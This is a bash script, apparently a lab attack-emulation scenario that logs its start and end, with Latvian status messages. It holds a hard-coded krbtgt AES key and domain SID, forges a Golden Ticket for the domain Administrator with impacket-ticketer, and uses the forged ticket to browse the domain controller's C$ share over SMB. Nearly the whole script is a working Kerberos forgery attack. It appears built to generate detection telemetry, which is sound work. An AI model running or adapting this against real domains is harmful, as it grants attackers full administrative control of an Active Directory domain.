#!/bin/bash

set -euo pipefail

KRBRGT_AES="f74b036bcf3f134378a85494b9a73bea7573fe0e58a5955c91a73547ce4fb71d"
DOMAIN_SID="S-1-5-21-1633286615-475136354-2689784634"
DC_HOSTNAME="dc-2019"
DOMAIN="lab.local"
DC_IP="10.99.10.10"
SCENARIO_ID="${1:-goldenticket}"
LOG_FILE="scenario.log"

START_TIME="$(date -Is)"
echo "${START_TIME},scenario=${SCENARIO_ID},type=goldenticket,status=start,domain=${DOMAIN},dc_ip=${DC_IP}" >> "${LOG_FILE}"

echo "[*] ${START_TIME}: Sākts Golden Ticket scenārijs ${SCENARIO_ID}"
echo "[*] Domēns: ${DOMAIN} DC: ${DC_IP}"

impacket-ticketer -aesKey ${KRBRGT_AES} -domain-sid ${DOMAIN_SID} -domain ${DOMAIN} -user-id 500 Administrator
export KRB5CCNAME=$(pwd)/Administrator.ccache
echo -e "use C$\nls\nexit" | impacket-smbclient -k -no-pass ${DOMAIN}/Administrator@${DC_HOSTNAME}.${DOMAIN} -dc-ip ${DC_IP}

END_TIME="$(date -Is)"
echo "${END_TIME},scenario=${SCENARIO_ID},type=goldenticket,status=end,domain=${DOMAIN},dc_ip=${DC_IP}" >> "${LOG_FILE}"

echo "[*] ${END_TIME}: Pabeigts scenārijs ${SCENARIO_ID}"

